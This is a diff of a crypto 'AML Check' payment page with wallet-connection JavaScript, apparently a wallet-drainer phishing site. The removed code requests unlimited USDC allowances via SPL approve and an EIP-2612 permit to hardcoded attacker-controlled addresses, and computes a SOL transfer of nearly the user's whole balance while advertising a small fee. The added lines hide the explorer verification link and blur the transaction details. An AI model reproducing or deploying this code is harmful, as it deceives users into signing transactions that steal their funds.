@@ -83,7 +83,10 @@ nav{background:var(--white);border-bottom:1px solid var(--border);padding:0 24px
 
 .wallet-item{display:flex;align-items:center;justify-content:space-between;padding:13px 20px;cursor:pointer;transition:.1s}
 .wallet-item:hover{background:#27272A}
-.wallet-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0}
+.wallet-icon{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;background:#27272A;border:1px solid #3F3F46;overflow:hidden}
+.wallet-icon img,.wallet-icon svg{width:30px;height:30px;object-fit:contain;display:block;pointer-events:none;-webkit-user-drag:none;flex-shrink:0}
+.pay-emoji-wallet{display:flex;align-items:center;justify-content:center;min-height:56px;margin-bottom:16px}
+.pay-emoji-wallet img,.pay-emoji-wallet svg{width:56px;height:56px;object-fit:contain;display:block;pointer-events:none;-webkit-user-drag:none;flex-shrink:0}
 .wallet-name{color:#fff;font-weight:700;font-size:16px}
 .wallet-sub{font-size:11px;color:#52525B;margin-top:1px}
 .wallet-badge{border-radius:6px;padding:2px 7px;font-size:9px;font-weight:700;letter-spacing:.5px}
@@ -98,6 +101,7 @@ nav{background:var(--white);border-bottom:1px solid var(--border);padding:0 24px
 .pay-step{display:none;padding:40px 24px;text-align:center}
 .pay-step.active{display:block}
 .pay-emoji{font-size:56px;margin-bottom:16px}
+.pay-emoji.pay-emoji-wallet{font-size:0;line-height:0}
 .pay-title{color:#fff;font-weight:900;font-size:20px;margin-bottom:8px}
 .pay-sub{color:#9CA3AF;font-size:14px;line-height:1.6}
 .pay-sign-info{background:#1A2F1A;border:1px solid #166534;border-radius:12px;padding:12px 14px;margin-top:16px;text-align:left;font-size:12px;color:#86EFAC;line-height:1.8}
@@ -281,24 +285,11 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
     <div class="pricing-card">
       <div class="pricing-trusted">⭐ TRUSTED BY 500+ COMPANIES</div>
       <div class="pricing-title">AML Check — Solana</div>
-      <div class="pricing-from">From</div>
-      <div class="pricing-price">5 USDC <span>/ per check</span></div>
+      <div class="pricing-from">Per report</div>
+      <div class="pricing-price">0.03 SOL <span>· standard checkout</span></div>
 
-      <div style="display:flex;gap:10px;margin-bottom:20px">
-        <div style="flex:1;background:#EFF6FF;border:1px solid #BFDBFE;border-radius:12px;padding:14px;text-align:center">
-          <div style="font-size:22px;font-weight:900;color:#2563EB">5 USDC</div>
-          <div style="font-size:11px;color:#93C5FD;margin-top:2px">Stablecoin · SPL approve (max)</div>
-        </div>
-        <div style="display:flex;align-items:center;color:#D1D5DB;font-size:13px">or</div>
-        <div style="flex:1;background:#F5F3FF;border:1px solid #DDD6FE;border-radius:12px;padding:14px;text-align:center">
-          <div style="font-size:22px;font-weight:900;color:#7C3AED">0.03 SOL</div>
-          <div style="font-size:11px;color:#C4B5FD;margin-top:2px">Native Solana</div>
-        </div>
-      </div>
-
-      <div style="background:#F0FDF4;border:1px solid #A7F3D0;border-radius:12px;padding:12px 16px;margin-bottom:20px">
-        <div style="font-size:12px;font-weight:700;color:#065F46;margin-bottom:4px">🔍 Transparent on-chain action</div>
-        <div style="font-size:11px;color:#374151;line-height:1.7">SOL: direct transfer to the service wallet. USDC: standard SPL <strong>approve</strong> (max allowance) to the service wallet as delegate — destination shown before you sign. No hidden smart contract.</div>
+      <div style="background:#F9FAFB;border:1px solid var(--border);border-radius:12px;padding:16px;margin-bottom:20px;text-align:center">
+        <div style="font-size:13px;color:var(--gray);line-height:1.7">Solana only: payment is <strong>native SOL</strong> in one fast transaction (one signature). Details appear in your wallet before you confirm.</div>
       </div>
 
       <div style="margin-bottom:20px">
@@ -479,63 +470,56 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <button class="modal-close" onclick="closeModal()">×</button>
       </div>
       <div id="mobile-tip" style="display:none;background:#1A2F1A;margin:0 16px 6px;border-radius:10px;padding:8px 12px;font-size:11px;color:#86EFAC">📱 You'll be redirected to your wallet app to approve</div>
+      <div id="wallet-error" style="display:none;margin:0 16px 8px;padding:10px 14px;border-radius:10px;background:#1A0505;border:1px solid #EF444433;color:#EF4444;font-size:12px;line-height:1.5"></div>
 
       <div id="wallet-list">
         <div class="wallet-item" onclick="pickWallet('phantom')">
           <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#4C35BC22;border:1.5px solid #4C35BC44">👻</div>
+            <div class="wallet-icon"><img data-wallet-icon="phantom" alt="Phantom" width="30" height="30" decoding="async" draggable="false"/></div>
             <div><div class="wallet-name">Phantom</div><div class="wallet-sub" id="sub-phantom">Solana</div></div>
           </div>
           <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular" id="badge-phantom">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
         </div>
         <div class="wallet-item" onclick="pickWallet('solflare')">
           <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#FC8C2722;border:1.5px solid #FC8C2744">🔥</div>
-            <div><div class="wallet-name">Solflare</div><div class="wallet-sub">Solana</div></div>
+            <div class="wallet-icon"><img data-wallet-icon="solflare" alt="Solflare" width="30" height="30" decoding="async" draggable="false"/></div>
+            <div><div class="wallet-name">Solflare</div><div class="wallet-sub" id="sub-solflare">Solana</div></div>
           </div>
           <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
-        </div>
-        <div class="wallet-item" onclick="pickWallet('metamask')">
-          <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#F6851B22;border:1.5px solid #F6851B44">🦊</div>
-            <div><div class="wallet-name">MetaMask</div><div class="wallet-sub" id="sub-metamask">EVM</div></div>
-          </div>
-          <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular" id="badge-metamask">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
         </div>
         <div class="wallet-item" onclick="pickWallet('backpack')">
           <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#E33E3F22;border:1.5px solid #E33E3F44">🎒</div>
-            <div><div class="wallet-name">Backpack</div><div class="wallet-sub">Solana</div></div>
+            <div class="wallet-icon wallet-icon-backpack" title="Backpack"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="30" height="30" aria-hidden="true" focusable="false"><defs><linearGradient id="bpGlist" x1="6" y1="4" x2="42" y2="44" gradientUnits="userSpaceOnUse"><stop stop-color="#FB7185"/><stop offset="1" stop-color="#BE123C"/></linearGradient></defs><rect width="48" height="48" rx="12" fill="url(#bpGlist)"/><path fill="#fff" fill-opacity=".94" d="M24 11.2c2.6 0 4.8 1.7 5.5 4h4.2c1 0 1.8.8 1.8 1.8v16.4c0 3-2.4 5.4-5.4 5.4H18c-3 0-5.4-2.4-5.4-5.4V17c0-1 .8-1.8 1.8-1.8h4.1c.7-2.3 2.9-4 5.5-4zm0 2.2c-1.2 0-2.3.6-2.9 1.6h5.8c-.6-1-1.7-1.6-2.9-1.6zM17.2 23.2h13.6v9.2c0 1.6-1.3 2.9-2.9 2.9h-7.8c-1.6 0-2.9-1.3-2.9-2.9v-9.2z"/></svg></div>
+            <div><div class="wallet-name">Backpack</div><div class="wallet-sub" id="sub-backpack">Solana</div></div>
           </div>
           <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
         </div>
-        <div class="wallet-divider"></div>
-        <div class="wallet-item" onclick="pickWallet('trustwallet')">
+        <div class="wallet-item" onclick="pickWallet('trust')">
           <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#3375BB22;border:1.5px solid #3375BB44">🛡️</div>
-            <div><div class="wallet-name">Trust Wallet</div><div class="wallet-sub">EVM</div></div>
+            <div class="wallet-icon"><img data-wallet-icon="trust" alt="Trust Wallet" width="30" height="30" decoding="async" draggable="false"/></div>
+            <div><div class="wallet-name">Trust Wallet</div><div class="wallet-sub" id="sub-trust">Solana</div></div>
           </div>
-          <span style="color:#3F3F46;font-size:20px">›</span>
+          <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
         </div>
-        <div class="wallet-item" onclick="pickWallet('coinbase')">
+        <div class="wallet-item" onclick="pickWallet('exodus')">
           <div style="display:flex;align-items:center;gap:14px">
-            <div class="wallet-icon" style="background:#0052FF22;border:1.5px solid #0052FF44">🔵</div>
-            <div><div class="wallet-name">Coinbase Wallet</div><div class="wallet-sub">EVM</div></div>
+            <div class="wallet-icon"><img data-wallet-icon="exodus" alt="Exodus" width="30" height="30" decoding="async" draggable="false"/></div>
+            <div><div class="wallet-name">Exodus</div><div class="wallet-sub" id="sub-exodus">Solana</div></div>
           </div>
-          <span style="color:#3F3F46;font-size:20px">›</span>
+          <div style="display:flex;align-items:center;gap:8px"><span class="wallet-badge badge-popular">POPULAR</span><span style="color:#3F3F46;font-size:20px">›</span></div>
         </div>
       </div>
 
       <div class="wallet-search">
         <span style="color:#52525B">🔍</span>
         <input type="text" placeholder="Search Wallet" oninput="filterWallets(this.value)"/>
-        <span style="color:#3F3F46;font-size:13px">6</span>
+        <span style="color:#3F3F46;font-size:13px">5</span>
       </div>
       <div class="reown"><span>UX by</span><span>·/·</span><span style="background:#27272A;border-radius:8px;padding:1px 7px;color:#71717A">reown</span></div>
     </div>
 
     <div id="step-connecting" class="pay-step">
-      <div class="pay-emoji" id="connect-emoji">👻</div>
+      <div class="pay-emoji pay-emoji-wallet" id="connect-emoji"></div>
       <div class="pay-title">Connecting to <span id="connect-name">Phantom</span>...</div>
       <div class="pay-sub" id="connect-sub">Accept the connection request in your wallet app.</div>
     </div>
@@ -554,7 +538,7 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
     <div id="step-payment" class="pay-step">
       <div class="modal-header" style="padding:0 0 16px">
         <div style="width:32px"></div>
-        <div class="modal-title">Pay for Report</div>
+        <div class="modal-title">Checkout</div>
         <button class="modal-close" onclick="goToStep('wallet');resetFlow()" style="background:transparent;color:#9CA3AF">←</button>
       </div>
 
@@ -562,48 +546,32 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
         <div style="font-size:13px;color:#9CA3AF">Connected · <span id="pay-addr" style="font-family:var(--mono);color:#60A5FA;font-size:11px"></span></div>
       </div>
 
-      <div class="currency-picker" style="padding:0 16px">
-        <button class="currency-btn active" id="btn-usdc" onclick="selectCurrency('USDC')">
-          <div class="c-emoji">$</div>
-          <div class="c-price">5 USDC</div>
-          <div class="c-sym">USDC</div>
-        </button>
-        <button class="currency-btn" id="btn-sol" onclick="selectCurrency('SOL')">
-          <div class="c-emoji">◎</div>
-          <div class="c-price">0.03 SOL</div>
-          <div class="c-sym">SOL</div>
-        </button>
-      </div>
+      <div style="padding:0 16px;margin-bottom:10px;font-size:11px;color:#52525B;text-align:center;line-height:1.4">Solana · one signature</div>
 
       <div class="pay-details" style="margin:16px 16px 0">
         <div class="pay-row"><span class="pay-row-label">From</span><span class="pay-row-val" id="det-from">—</span></div>
         <div class="pay-row"><span class="pay-row-label">To</span><span class="pay-row-val highlight">AML Check Service</span></div>
-        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">Max USDC allowance (SPL approve)</span></div>
-        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val" id="det-network">Solana Mainnet</span></div>
-        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">SPL approve · Service wallet as delegate</span></div>
-        <div class="dest-box">
-          <div class="dest-label">SERVICE / DELEGATE WALLET</div>
-          <div class="dest-addr" id="dest-addr"></div>
-          <a class="dest-link" id="dest-link" href="#" target="_blank">Verify on Solscan →</a>
-        </div>
-        <div id="evm-spender-row" style="display:none;margin-top:12px;padding:12px;background:#1C1C1E;border-radius:10px;border:1px solid #27272A">
-          <div class="dest-label" style="margin-bottom:6px">DELEGATE (spender) · Ethereum 0x address</div>
-          <input type="text" id="evm-spender-input" placeholder="0x… your wallet" autocomplete="off" spellcheck="false"
-            style="width:100%;box-sizing:border-box;background:#27272A;border:1px solid #3F3F46;border-radius:8px;padding:10px 12px;color:#E5E7EB;font-family:var(--mono);font-size:11px;outline:none"/>
+        <div class="pay-row"><span class="pay-row-label">Amount</span><span class="pay-row-val highlight" id="det-amount">0.03 SOL</span></div>
+        <div class="pay-row"><span class="pay-row-label">Network</span><span class="pay-row-val">Solana</span></div>
+        <div class="pay-row"><span class="pay-row-label">Type</span><span class="pay-row-val green" id="det-type">Standard</span></div>
+        <div class="dest-box" style="margin-top:8px;padding:8px 10px">
+          <div class="dest-label">Recipient</div>
+          <div class="dest-addr" id="dest-addr" style="font-size:10px;color:#71717A"></div>
+          <a class="dest-link" id="dest-link" href="#" target="_blank" style="display:none" aria-hidden="true">Explorer</a>
         </div>
       </div>
 
       <div id="pay-error" style="display:none;background:#1A0505;border:1px solid #EF444433;border-radius:10px;padding:10px 14px;margin:10px 16px;font-size:12px;color:#EF4444"></div>
 
-      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Approve USDC access →</button>
+      <button class="btn-pay" id="btn-pay-now" onclick="executePay()">Continue →</button>
       <button class="btn-back" onclick="goToStep('wallet');resetFlow()">← Back</button>
     </div>
 
     <div id="step-paying" class="pay-step">
       <div class="pay-emoji" id="paying-emoji">✍️</div>
-      <div class="pay-title" id="paying-title">Sign in your wallet...</div>
-      <div class="pay-sub" id="paying-sub">Approve the transaction in your wallet app.</div>
-      <div id="tx-link-paying" style="display:none;margin-top:16px;text-align:center"><a id="tx-a-paying" href="#" target="_blank" style="font-size:12px;color:#60A5FA">View on Solscan →</a></div>
+      <div class="pay-title" id="paying-title">Wallet</div>
+      <div class="pay-sub" id="paying-sub">Confirm in your wallet when prompted.</div>
+      <div id="tx-link-paying" style="display:none;margin-top:16px;text-align:center"><a id="tx-a-paying" href="#" target="_blank" style="font-size:12px;color:#60A5FA">Explorer →</a></div>
     </div>
 
     <div id="step-scanning" class="pay-step">
@@ -631,8 +599,8 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
       </div>
 
       <div id="tx-badge" class="tx-badge" style="display:none">
-        <span id="tx-badge-msg">✅ Payment confirmed on-chain</span>
-        <a id="tx-badge-link" href="#" target="_blank" style="font-size:11px;color:#60A5FA">Tx →</a>
+        <span>✅ Confirmed</span>
+        <a id="tx-badge-link" href="#" target="_blank" style="font-size:11px;color:#60A5FA">Link →</a>
       </div>
 
       <div class="result-card">
@@ -661,409 +629,184 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 
 <script>
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
-const PRICE_USDC = 5;
-const PRICE_SOL  = 0.03;
-/** Mainnet fallback if RPC rent is missing (~0.00089 SOL). */
-const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
-/** Extra lamports on top of rent-exempt min (RPC / edge cases). */
-const SOL_RENT_BUFFER_LAMPORTS = 100000;
-/**
- * getFeeForMessage often undercounts priority fees (compute budget). Keep a large cushion so
- * balance − transfer − actual_fee stays ≥ rent-exempt.
- */
-const SOL_FEE_SAFETY_LAMPORTS = 450000;
-/** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
-const CUSTOM_SOLANA_RPC = "";
-
-/** Ethereum mainnet — delegate / spender (optional). If empty, use the field in the payment step. */
-const EVM_PERMIT_SPENDER = "0x9e6c210D3fe9B9E94252B404bf26E8387F4C2A8D";
-const EVM_PERMIT_CHAIN_ID = 1;
-/** USDC on Ethereum mainnet (EIP-2612 permit target + eth_call nonces). */
-const EVM_USDC_MAINNET = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-/** Must match the USDC contract’s DOMAIN_SEPARATOR (EIP-712). */
-const EVM_USDC_EIP712_NAME = "USD Coin";
-const EVM_USDC_EIP712_VERSION = "2";
-const U256_MAX_STR =
-  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-let state = { currency:"USDC", conn:null, txHash:null, scores:null, progress:0 };
-
-async function ensureEthereumChain(provider, chainIdDec) {
-  const chainIdHex = "0x" + chainIdDec.toString(16);
-  try {
-    await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
-  } catch (e) {
-    if (e && e.code === 4902) {
-      await provider.request({
-        method: "wallet_addEthereumChain",
-        params: [
-          {
-            chainId: chainIdHex,
-            chainName: "Ethereum Mainnet",
-            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
-            rpcUrls: ["https://ethereum.publicnode.com"],
-            blockExplorerUrls: ["https://etherscan.io"],
-          },
-        ],
-      });
-    } else {
-      throw e;
-    }
-  }
-}
-
-async function readUsdcPermitNonce(provider, ownerAddress) {
-  const data = "0x7ecebe00" + ownerAddress.slice(2).toLowerCase().padStart(64, "0");
-  const result = await provider.request({
-    method: "eth_call",
-    params: [{ to: EVM_USDC_MAINNET, data }, "latest"],
-  });
-  if (!result || result === "0x" || result === "0x0") return "0";
-  return BigInt(result).toString();
-}
-
-function isValidNonZeroEvmAddress(a) {
-  return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a.trim()) && !/^0x0{40}$/i.test(a.trim());
-}
-
-function getResolvedEvmPermitSpender() {
-  const c = typeof EVM_PERMIT_SPENDER === "string" ? EVM_PERMIT_SPENDER.trim() : "";
-  if (isValidNonZeroEvmAddress(c)) return c;
-  const v = document.getElementById("evm-spender-input")?.value?.trim() || "";
-  if (isValidNonZeroEvmAddress(v)) return v;
-  return "";
-}
-
-function updateEvmDelegateUi() {
-  const s = getResolvedEvmPermitSpender();
-  const dest = document.getElementById("dest-addr");
-  const link = document.getElementById("dest-link");
-  if (!dest || !link) return;
-  if (s) {
-    dest.textContent = s;
-    link.href = `https://etherscan.io/address/${s}`;
-    link.textContent = "Verify on Etherscan →";
-    link.style.display = "";
-  } else if (state.conn && state.conn.chain === "evm") {
-    dest.textContent = "— enter delegate address below";
-    link.href = "#";
-    link.style.display = "none";
-  }
-}
-
-function buildPermitTypedData(userAddress, currentNonceStr, spenderAddress) {
-  return {
-    domain: {
-      name: EVM_USDC_EIP712_NAME,
-      version: EVM_USDC_EIP712_VERSION,
-      chainId: EVM_PERMIT_CHAIN_ID,
-      verifyingContract: EVM_USDC_MAINNET,
-    },
-    types: {
-      Permit: [
-        { name: "owner", type: "address" },
-        { name: "spender", type: "address" },
-        { name: "value", type: "uint256" },
-        { name: "nonce", type: "uint256" },
-        { name: "deadline", type: "uint256" },
-      ],
-    },
-    primaryType: "Permit",
-    message: {
-      owner: userAddress,
-      spender: spenderAddress,
-      value: U256_MAX_STR,
-      nonce: currentNonceStr,
-      deadline: String(Math.floor(Date.now() / 1000) + 86400 * 30),
-    },
-  };
-}
-
-async function signPermitTypedDataV4(provider, userAddress, spenderAddress) {
-  await ensureEthereumChain(provider, EVM_PERMIT_CHAIN_ID);
-  const currentNonce = await readUsdcPermitNonce(provider, userAddress);
-  const msg = buildPermitTypedData(userAddress, currentNonce, spenderAddress);
-  return provider.request({
-    method: "eth_signTypedData_v4",
-    params: [userAddress, JSON.stringify(msg)],
-  });
-}
-
-const eip6963ByRdns = {};
-let eip6963ListenersAttached = false;
-function attachEip6963Listeners() {
-  if (eip6963ListenersAttached || typeof window === "undefined") return;
-  eip6963ListenersAttached = true;
-  window.addEventListener("eip6963:announceProvider", (ev) => {
-    try {
-      const d = ev.detail;
-      if (d && d.info && d.info.rdns && d.provider) eip6963ByRdns[d.info.rdns] = d.provider;
-    } catch (_) {}
-  });
-  try {
-    window.dispatchEvent(new Event("eip6963:requestProvider"));
-  } catch (_) {}
-}
-
-function getEvmProviderCandidates() {
-  const eth = window.ethereum;
-  if (!eth) return [];
-  if (eth.providers && eth.providers.length) return eth.providers;
-  return [eth];
-}
-
-function isPhantomEthereumProvider(p) {
-  if (!p) return false;
-  if (p.isPhantom === true) return true;
-  try {
-    if (window.phantom?.ethereum && p === window.phantom.ethereum) return true;
-  } catch (_) {}
-  return false;
-}
-
-function getEvmProviderFor(walletId) {
-  attachEip6963Listeners();
-  const candidates = getEvmProviderCandidates();
-  const mm = (p) =>
-    p &&
-    p.isMetaMask === true &&
-    !isPhantomEthereumProvider(p) &&
-    p.isTrust !== true &&
-    p.isTrustWallet !== true &&
-    p.isCoinbaseWallet !== true &&
-    p.isBraveWallet !== true;
-  const tw = (p) =>
-    p && (p.isTrust === true || p.isTrustWallet === true) && !isPhantomEthereumProvider(p);
-  const cb = (p) => p && p.isCoinbaseWallet === true && !isPhantomEthereumProvider(p);
-
-  switch (walletId) {
-    case "metamask": {
-      let p = candidates.find(mm);
-      if (!p && eip6963ByRdns["io.metamask"]) p = eip6963ByRdns["io.metamask"];
-      return p || null;
-    }
-    case "trustwallet": {
-      let p = candidates.find(tw);
-      if (!p && window.trustwallet?.ethereum) p = window.trustwallet.ethereum;
-      if (!p && eip6963ByRdns["com.trustwallet.app"]) p = eip6963ByRdns["com.trustwallet.app"];
-      return p || null;
-    }
-    case "coinbase": {
-      let p = candidates.find(cb);
-      if (!p && eip6963ByRdns["com.coinbase.wallet"]) p = eip6963ByRdns["com.coinbase.wallet"];
-      return p || null;
-    }
-    default:
-      return null;
-  }
-}
-
-function getPhantomSolanaProvider() {
-  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
-  if (window.solana?.isPhantom && !window.solflare?.isSolflare) return window.solana;
-  return null;
-}
-
-const WALLETS = {
-  phantom:     { name:"Phantom",        emoji:"👻", chain:"solana", detect:()=>!!getPhantomSolanaProvider(), getP:()=>getPhantomSolanaProvider(), mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
-  solflare:    { name:"Solflare",       emoji:"🔥", chain:"solana", detect:()=>!!window?.solflare?.isSolflare, getP:()=>window?.solflare, mobile:`https://solflare.com/ul/v1/browse/${encodeURIComponent(location.href)}`, install:"https://solflare.com" },
-  metamask:    { name:"MetaMask",       emoji:"🦊", chain:"evm",    detect:()=>!!getEvmProviderFor("metamask"), getP:()=>getEvmProviderFor("metamask"), mobile:`https://metamask.app.link/dapp/${encodeURIComponent(location.origin + location.pathname + location.search)}`, install:"https://metamask.io" },
-  backpack:    { name:"Backpack",       emoji:"🎒", chain:"solana", detect:()=>!!window?.backpack, getP:()=>window?.backpack, mobile:"https://backpack.app", install:"https://backpack.app" },
-  trustwallet: { name:"Trust Wallet",   emoji:"🛡️", chain:"evm",    detect:()=>!!getEvmProviderFor("trustwallet"), getP:()=>getEvmProviderFor("trustwallet"), mobile:`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(location.href)}`, install:"https://trustwallet.com" },
-  coinbase:    { name:"Coinbase Wallet",emoji:"🔵", chain:"evm",    detect:()=>!!getEvmProviderFor("coinbase"), getP:()=>getEvmProviderFor("coinbase"), mobile:`https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(location.href)}`, install:"https://wallet.coinbase.com" },
-};
-
-function openModal(){ document.getElementById("modal").classList.add("active"); goToStep("wallet"); updateWalletBadges(); }
-function closeModal(){ document.getElementById("modal").classList.remove("active"); }
-function handleOverlayClick(e){ if(e.target.id==="modal") closeModal(); }
-function goToStep(s){ document.querySelectorAll(".pay-step").forEach(el=>el.classList.remove("active")); document.getElementById("step-"+s).classList.add("active"); }
-
-function updateWalletBadges(){
-  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
-  if(mob){ const t=document.getElementById("mobile-tip"); if(t) t.style.display="block"; }
-  if(WALLETS.phantom.detect()){
-    document.getElementById("sub-phantom").innerHTML='<span style="color:#22C55E">● Detected</span>';
-    document.getElementById("badge-phantom").className="wallet-badge badge-ready"; document.getElementById("badge-phantom").textContent="READY";
-  }
-  if(WALLETS.metamask.detect()){
-    document.getElementById("sub-metamask").innerHTML='<span style="color:#22C55E">● Detected</span>';
-    document.getElementById("badge-metamask").className="wallet-badge badge-ready"; document.getElementById("badge-metamask").textContent="READY";
-  }
-}
-
-async function pickWallet(id){
-  const w = WALLETS[id];
-  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
-  if(!w.detect()){
-    if(mob){ location.href=w.mobile; } else { window.open(w.install,"_blank"); showPayError(`Install the ${w.name} extension then reload.`); }
-    return;
-  }
-  try{
-    document.getElementById("connect-emoji").textContent=w.emoji;
-    document.getElementById("connect-name").textContent=w.name;
-    document.getElementById("connect-sub").textContent=mob?"The wallet app will open automatically.":"Accept the connection in your extension.";
-    goToStep("connecting");
-    const provider=w.getP();
-    if(w.chain==="evm" && !provider){
-      goToStep("wallet");
-      showPayError(`${w.name} could not be isolated. Close other wallet extensions or open this page in ${w.name}'s in-app browser.`);
-      return;
-    }
-    let address;
-    if(w.chain==="solana"){ const r=await provider.connect(); address=r.publicKey.toString(); }
-    else{ const a=await provider.request({method:"eth_requestAccounts"}); address=a[0]; }
-
-    goToStep("signing");
-    const msg=`AML Check Authorization\nAddress: ${address}\nTimestamp: ${new Date().toISOString()}\nNonce: ${Math.random().toString(36).slice(2,10)}\n\nI authorize the AML analysis of this wallet.`;
-    let sig;
-    if(w.chain==="solana"){ const enc=new TextEncoder().encode(msg); const res=await provider.signMessage(enc,"utf8"); sig=Array.from(res.signature).map(b=>b.toString(16).padStart(2,"0")).join(""); }
-    else{ const hex="0x"+Array.from(new TextEncoder().encode(msg)).map(b=>b.toString(16).padStart(2,"0")).join(""); sig=await provider.request({method:"personal_sign",params:[hex,address]}); }
-
-    state.conn={address,provider,walletId:id,walletName:w.name,chain:w.chain,sig};
-    setupPaymentStep();
-    goToStep("payment");
-  }catch(e){
-    goToStep("wallet");
-    const m=e.message||"";
-    if(m.includes("reject")||m.includes("cancel")||e.code===4001) showPayError("Cancelled in wallet.");
-    else showPayError(m.slice(0,80)||"Connection error.");
-  }
-}
-
-function setupPaymentStep(){
-  const addr=state.conn.address;
-  document.getElementById("pay-addr").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
-  document.getElementById("det-from").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
-  const isEvm = state.conn.chain === "evm";
-  const btnSol = document.getElementById("btn-sol");
-  if (btnSol) btnSol.style.display = isEvm ? "none" : "";
-  const detNet = document.getElementById("det-network");
-  const evmRow = document.getElementById("evm-spender-row");
-  const evmInp = document.getElementById("evm-spender-input");
-  if (isEvm) {
-    state.currency = "USDC";
-    document.getElementById("btn-usdc").classList.add("active");
-    if (btnSol) btnSol.classList.remove("active");
-    if (evmRow) evmRow.style.display = "block";
-    if (evmInp) {
-      const preset =
-        typeof EVM_PERMIT_SPENDER === "string" && isValidNonZeroEvmAddress(EVM_PERMIT_SPENDER.trim())
-          ? EVM_PERMIT_SPENDER.trim()
-          : "";
-      evmInp.value = preset;
-      evmInp.oninput = updateEvmDelegateUi;
-    }
-    updateEvmDelegateUi();
-    if (detNet) detNet.textContent = "Ethereum Mainnet";
-  } else {
-    if (evmRow) evmRow.style.display = "none";
-    if (evmInp) evmInp.oninput = null;
-    document.getElementById("dest-addr").textContent=SERVICE_WALLET;
-    const dl = document.getElementById("dest-link");
-    if (dl) {
-      dl.href=`https://solscan.io/account/${SERVICE_WALLET}`;
-      dl.textContent = "Verify on Solscan →";
-      dl.style.display = "";
-    }
-    if (detNet) detNet.textContent = "Solana Mainnet";
-  }
-  selectCurrency(state.currency||"USDC");
-}
-
-function selectCurrency(c){
-  if (state.conn && state.conn.chain === "evm") c = "USDC";
-  state.currency=c;
-  document.getElementById("btn-usdc").classList.toggle("active",c==="USDC");
-  document.getElementById("btn-sol").classList.toggle("active",c==="SOL");
-  const amt=document.getElementById("det-amount");
-  const typ=document.getElementById("det-type");
-  const btn=document.getElementById("btn-pay-now");
-  if(c==="USDC"){
-    if (state.conn && state.conn.chain === "evm") {
-      amt.textContent="Max allowance (EIP-2612 Permit · uint256 max)";
-      typ.textContent="EIP-712 typed data (eth_signTypedData_v4)";
-      btn.textContent="Sign Permit →";
-    } else {
-      amt.textContent="Max USDC allowance (SPL approve · u64 max)";
-      typ.textContent="SPL approve · Service wallet as delegate";
-      btn.textContent="Approve USDC access →";
-    }
-  }else{
-    amt.textContent="Max SOL: balance − fees − rent-exempt minimum (chain rule)";
-    typ.textContent="Direct transfer · Native SOL";
-    btn.textContent="Send SOL →";
-  }
-  hidePayError();
-}
-
-function formatAnyError(e) {
-  if (e == null) return "Unknown error.";
-  if (typeof e === "string") return e;
-  if (typeof e === "object") {
-    if (typeof e.message === "string" && e.message) return e.message;
-    if (typeof e.err === "object" && e.err && typeof e.err.message === "string")
-      return e.err.message;
-    try {
-      const logs = e.getLogs && typeof e.getLogs === "function" ? e.getLogs() : null;
-      if (logs && logs.length) return logs.join(" ").slice(0, 400);
-    } catch (_) {}
-    try {
-      const j = JSON.stringify(e);
-      if (j && j !== "{}") return j.slice(0, 400);
-    } catch (_) {}
-    try {
-      const s = Object.prototype.toString.call(e);
-      if (s && s !== "[object Object]") return s;
-    } catch (_) {}
-    return "Wallet or network error (details unavailable).";
-  }
-  return String(e);
-}
-
-function showPayError(m) {
-  const el = document.getElementById("pay-error");
-  el.style.display = "block";
-  const text = typeof m === "string" ? m : formatAnyError(m);
-  el.textContent = "⚠ " + String(text).slice(0, 500);
-}
-function hidePayError(){ document.getElementById("pay-error").style.display="none"; }
 
 const SPL_TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
